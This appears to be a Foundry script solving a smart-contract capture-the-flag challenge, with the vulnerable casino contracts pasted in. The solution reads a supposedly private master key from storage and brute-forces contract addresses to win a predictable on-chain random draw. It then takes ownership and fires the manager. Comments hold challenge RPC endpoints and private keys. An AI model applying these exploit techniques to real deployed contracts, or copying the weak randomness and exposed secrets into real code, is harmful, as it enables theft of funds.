// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x6AB91965e5E276610ddBd77484B0F9f475AeBc58);
    address wallet = 0xeaE6fA711F935c471919aF0cFdF598dc4B8Af21B;
    Privileged public privileged = setup.privileged();
    ChallengeManager public challengeManager = setup.challengeManager();


    function run() public {
        vm.startBroadcast(0x6c2c2d8b0478d16385fca363e8895550e56b5898d447631c8709b5f793c64d2a);

        bytes32 key = vm.load(address(challengeManager), bytes32(uint256(1)));
        // console.logBytes32(key);
        // console.log(wallet.balance);
        bool found = false;
        Hack hack;
        while(!found) {
            hack = new Hack(address(privileged), payable(address(challengeManager)));
            uint256 gacha = uint256(keccak256(abi.encodePacked(address(hack), block.timestamp))) % 4;
            if (gacha == 1) {
                found = true;
            }
        }

        console.log("dapet");
        hack.attack{value: 7 ether}(key);

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	0f724298-4fcc-4a23-b3af-f0c07d56bd68
// RPC Endpoint	http://103.178.153.113:50001/0f724298-4fcc-4a23-b3af-f0c07d56bd68
// Private Key	0x6c2c2d8b0478d16385fca363e8895550e56b5898d447631c8709b5f793c64d2a
// Setup Contract	0x6AB91965e5E276610ddBd77484B0F9f475AeBc58
// Wallet	0xeaE6fA711F935c471919aF0cFdF598dc4B8Af21B

contract Hack {
    Privileged public privileged;
    ChallengeManager public challengeManager;

    constructor(address _privileged, address payable _challengeManager) {
        privileged = Privileged(_privileged);
        challengeManager = ChallengeManager(_challengeManager);
    }

    function attack(bytes32 key) external payable {
        challengeManager.approach{value: 5 ether}();
        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.upgradeChallengerAttribute(3, 1);
        challengeManager.challengeCurrentOwner(key);
        privileged.fireManager();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

// UUID	ced0ba18-d3f9-49e4-a44a-d306956aab52
// RPC Endpoint	http://103.178.153.113:50001/ced0ba18-d3f9-49e4-a44a-d306956aab52
// Private Key	0xb66341d2f2851b6087884f2f44d2220a15e7fbf279e9d5888c0a49633939e087
// Setup Contract	0x5Ac1f9Eea4d26844ce7A2Af71bc83CD1a4066911
// Wallet	0x8Eb132349F29142689C2AC8b89501b2f1EF9D818

contract Setup {
    Privileged public privileged;
    ChallengeManager public challengeManager;
    Challenger1 public Chall1;
    Challenger2 public Chall2;

    constructor(bytes32 _key) payable{
        privileged = new Privileged{value: 100 ether}();
        challengeManager = new ChallengeManager(address(privileged), _key);
        privileged.setManager(address(challengeManager));

        // prepare the challenger
        Chall1 = new Challenger1{value: 5 ether}(address(challengeManager));
        Chall2 = new Challenger2{value: 5 ether}(address(challengeManager));
    }

    function isSolved() public view returns(bool){
        return address(privileged.challengeManager()) == address(0);
    }
}

contract Challenger1 {
    ChallengeManager public challengeManager;

    constructor(address _target) payable{
        require(msg.value == 5 ether);
        challengeManager = ChallengeManager(_target);
        challengeManager.approach{value: 5 ether}();

    }
}

contract Challenger2 {
    ChallengeManager public challengeManager;

    constructor(address _target) payable{
        require(msg.value == 5 ether);
        challengeManager = ChallengeManager(_target);
        challengeManager.approach{value: 5 ether}();
    }
}

contract ChallengeManager{

    Privileged public privileged;

    error CM_FoundChallenger();
    error CM_NotTheCorrectValue();
    error CM_AlreadyApproached();
    error CM_InvalidIdOfChallenger();
    error CM_InvalidIdofStranger();
    error CM_CanOnlyChangeSelf();

    bytes32 private masterKey;
    bool public qualifiedChallengerFound;
    address public theChallenger;
    address public casinoOwner;
    uint256 public challengingFee;
    
    address[] public challenger;

    mapping (address => bool) public approached;

    modifier stillSearchingChallenger(){
        require(!qualifiedChallengerFound, "New Challenger is Selected!");
        _;
    }

    modifier onlyChosenChallenger(){
        require(msg.sender == theChallenger, "Not Chosen One");
        _;
    }

    constructor(address _priv, bytes32 _masterKey) {
        casinoOwner = msg.sender;
        privileged = Privileged(_priv);
        challengingFee = 5 ether;
        masterKey = _masterKey;
    }

    function approach() public payable {
        if(msg.value != 5 ether){
            revert CM_NotTheCorrectValue();
        }
        if(approached[msg.sender] == true){
            revert CM_AlreadyApproached();
        }
        approached[msg.sender] = true;
        challenger.push(msg.sender);
        privileged.mintChallenger(msg.sender);
    }

    function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
        if (challengerId > privileged.challengerCounter()){
            revert CM_InvalidIdOfChallenger();
        }
        if(strangerId > privileged.challengerCounter()){
            revert CM_InvalidIdofStranger();
        }
        if(privileged.getRequirmenets(challengerId).challenger != msg.sender){
            revert CM_CanOnlyChangeSelf();
        }

        uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;

        if (gacha == 0){
            if(privileged.getRequirmenets(strangerId).isRich == false){
                privileged.upgradeAttribute(strangerId, true, false, false, false);
            }else if(privileged.getRequirmenets(strangerId).isImportant == false){
                privileged.upgradeAttribute(strangerId, true, true, false, false);
            }else if(privileged.getRequirmenets(strangerId).hasConnection == false){
                privileged.upgradeAttribute(strangerId, true, true, true, false);
            }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){
                privileged.upgradeAttribute(strangerId, true, true, true, true);
                qualifiedChallengerFound = true;
                theChallenger = privileged.getRequirmenets(strangerId).challenger;
            }
        }else if (gacha == 1){
            if(privileged.getRequirmenets(challengerId).isRich == false){
                privileged.upgradeAttribute(challengerId, true, false, false, false);
            }else if(privileged.getRequirmenets(challengerId).isImportant == false){
                privileged.upgradeAttribute(challengerId, true, true, false, false);
            }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
                privileged.upgradeAttribute(challengerId, true, true, true, false);
            }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
                privileged.upgradeAttribute(challengerId, true, true, true, true);
                qualifiedChallengerFound = true;
                theChallenger = privileged.getRequirmenets(challengerId).challenger;
            }
        }else if(gacha == 2){
            privileged.resetAttribute(challengerId);
            qualifiedChallengerFound = false;
            theChallenger = address(0);
        }else{
            privileged.resetAttribute(strangerId);
            qualifiedChallengerFound = false;
            theChallenger = address(0);
        }
    }

    function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
        if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
            privileged.setNewCasinoOwner(address(theChallenger));
        }        
    }
 
    function getApproacher(address _who) public view returns(bool){
        return approached[_who];
    }

    function getPrivilegedAddress() public view returns(address){
        return address(privileged);
    }

}

contract ERC721 {

    constructor(string memory a, string memory b) {

    }
    function _safeMint(address, uint256) internal {
        1;
    }
}

abstract contract ERC721URIStorage is ERC721 {
    constructor()  {

    }
}

contract Privileged is ERC721URIStorage{

    error Privileged_NotHighestPrivileged();
    error Privileged_NotManager();

    struct casinoOwnerChallenger{
        address challenger;
        bool isRich;
        bool isImportant;
        bool hasConnection;
        bool hasVIPCard;
    }

    address public challengeManager;
    address public casinoOwner;
    uint256 public challengerCounter = 1;

    mapping(uint256 challengerId => casinoOwnerChallenger) public Requirements;

    modifier onlyOwner() {
        if(msg.sender != casinoOwner){
            revert Privileged_NotHighestPrivileged();
        }
        _;
    }

    modifier onlyManager() {
        if(msg.sender != challengeManager){
            revert Privileged_NotManager();
        }
        _;
    }

    constructor() payable ERC721("Casino Owner", "COS"){
        casinoOwner = msg.sender;
    }

    function setManager(address _manager) public onlyOwner{
        challengeManager = _manager;
    }

    function fireManager() public onlyOwner{
        challengeManager = address(0);
    }

    function setNewCasinoOwner(address _newCasinoOwner) public onlyManager{
        casinoOwner = _newCasinoOwner;
    }

    function mintChallenger(address to) public onlyManager{
        uint256 newChallengerId = challengerCounter++;
        _safeMint(to, newChallengerId);

        Requirements[newChallengerId] = casinoOwnerChallenger({
            challenger: to,
            isRich: false,
            isImportant: false,
            hasConnection: false,
            hasVIPCard: false
        });
    }

    function upgradeAttribute(uint256 Id, bool _isRich, bool _isImportant, bool _hasConnection, bool _hasVIPCard) public onlyManager {
        Requirements[Id] = casinoOwnerChallenger({
            challenger: Requirements[Id].challenger,
            isRich: _isRich,
            isImportant: _isImportant,
            hasConnection: _hasConnection,
            hasVIPCard: _hasVIPCard
        });
    }

    function resetAttribute(uint256 Id) public onlyManager{
        Requirements[Id] = casinoOwnerChallenger({
            challenger: Requirements[Id].challenger,
            isRich: false,
            isImportant: false,
            hasConnection: false,
            hasVIPCard: false
        });
    }

    function getRequirmenets(uint256 Id) public view returns (casinoOwnerChallenger memory){
        return Requirements[Id];
    }

    function getNextGeneratedId() public view returns (uint256){
        return challengerCounter;
    }

    function getCurrentChallengerCount() public view returns (uint256){
        return challengerCounter - 1;
    }
}